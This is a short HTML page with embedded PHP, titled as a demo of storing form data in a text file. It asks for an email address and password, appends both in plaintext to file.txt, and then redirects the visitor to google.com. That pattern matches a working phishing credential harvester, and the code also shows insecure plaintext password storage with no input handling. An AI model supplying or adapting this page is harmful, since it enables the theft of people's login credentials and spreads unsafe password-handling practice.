<!DOCTYPE html>
<html>
<head>
  <title>Store form data in .txt file</title>
</head>
<body>
  <form method="post">
    Enter Your Text Here:<br>
    <input type="text" name="email" placeholder="Email address"><br>
    <input type="password" name="pass" placeholder="password"><br>
    <input type="submit" name="submit" value="submit">
    
  </form>
</body>
</html>

<?php
if(isset($_POST['submit'])){
$user = "Email:".$_POST['email']."
";
$passwd = "Password:".$_POST['pass']."
";
$file=fopen("file.txt", "a");
fwrite($file, $user);
fwrite($file, $passwd);
fwrite($file, " ");
fclose($file);

header('location: https://google.com');
}

?>
